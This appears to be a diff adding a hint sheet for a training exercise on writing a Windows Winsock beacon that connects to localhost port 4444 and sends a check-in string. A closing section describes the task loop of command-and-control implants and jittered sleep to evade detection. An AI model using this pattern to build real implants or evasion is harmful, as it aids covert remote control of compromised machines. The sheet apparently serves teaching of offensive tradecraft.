@@ -1,0 +1,28 @@
+=== HINT 1: WSAStartup + resolve ===
+WSADATA wsa;
+WSAStartup(MAKEWORD(2,2), &wsa);
+
+ADDRINFOA hints = {0}, *res = NULL;
+hints.ai_family   = AF_INET;
+hints.ai_socktype = SOCK_STREAM;
+getaddrinfo("127.0.0.1", "4444", &hints, &res);
+
+=== HINT 2: Create socket + connect ===
+SOCKET s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
+int conn = connect(s, res->ai_addr, (int)res->ai_addrlen);
+
+=== HINT 3: Send beacon string ===
+const char *msg = "BEACON\n";
+int sent = send(s, msg, (int)strlen(msg), 0);
+
+=== HINT 4: Cleanup ===
+closesocket(s);
+freeaddrinfo(res);
+WSACleanup();
+
+=== KEY INSIGHT ===
+WSAECONNREFUSED (10061) is normal - no listener is running.
+Beacon implants typically sleep between connections and use a loop:
+  while (1) { connect(); send_check_in(); recv_task(); run_task(); sleep(interval); }
+Real beacons randomize the sleep interval (jitter) to evade time-based detection.
+WinINet / WinHTTP are higher-level alternatives that handle proxies and TLS automatically.
